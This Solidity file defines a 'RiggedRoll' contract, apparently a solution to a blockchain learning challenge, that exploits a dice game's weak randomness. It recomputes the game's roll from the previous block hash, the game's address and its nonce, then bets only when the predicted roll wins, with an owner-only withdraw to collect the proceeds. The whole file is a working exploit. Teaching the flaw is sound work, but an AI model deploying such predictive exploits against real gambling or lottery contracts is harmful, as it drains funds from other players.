pragma solidity >=0.8.0 <0.9.0;
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

error RiggedRoll__NotEnoughBalance();

contract RiggedRoll is Ownable {
    DiceGame public diceGame;

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }

    receive() external payable {}

    function withdraw() public onlyOwner {
        payable(msg.sender).call{value: address(this).balance}("");
    }

    function riggedRoll() public {
        if (address(this).balance < .002 ether) {
            revert RiggedRoll__NotEnoughBalance();
        }
        uint256 nonce = diceGame.nonce();
        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(
            abi.encodePacked(prevHash, address(diceGame), nonce)
        );
        uint256 roll = uint256(hash) % 16;
        console.log("ROLL PREDICTED: ", roll);
        if (roll <= 2) {
            diceGame.rollTheDice{value: 0.002 ether}();
        }
    }
}
